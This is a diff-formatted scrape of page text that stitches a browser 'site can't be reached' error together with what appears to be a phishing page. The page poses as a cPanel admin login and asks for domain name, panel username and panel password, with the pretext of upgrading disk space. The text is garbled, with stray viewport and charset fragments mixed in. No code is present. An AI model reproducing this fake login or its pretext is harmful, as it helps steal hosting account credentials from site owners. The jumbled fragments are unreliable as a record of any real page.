@@ -1,0 +1,16 @@
+www.cciad.snThis site can’t be reached
+The webpage at http://www.cciad.sn/dump/2u22k2/acesso/index1.php might be temporarily down or it may have moved permanently to a new web address.
+ERR_NAME_RESOLUTION_FAILED   width=device-width, initial-scale=1.0,
+                                 maximum-scale=1.0, user-scalable=no
+CPANEL                                                                                                                                                                      C-Panel Admin              
+   Please Log-in with your Domain name and panel username and password to upgrade your Disk space and file uploading portal.  
+                                                               Login
+                                                            Domain Name
+                                                                                                                                                  Panel Username
+                                                                                   
+                                                                                      
+                                                                                          Panel Password
+                                                                                   
+                                                                                               
+                                                                                                                                                                          Manage Your C-panel  
+       text/html; charset=windows-1252 en-us
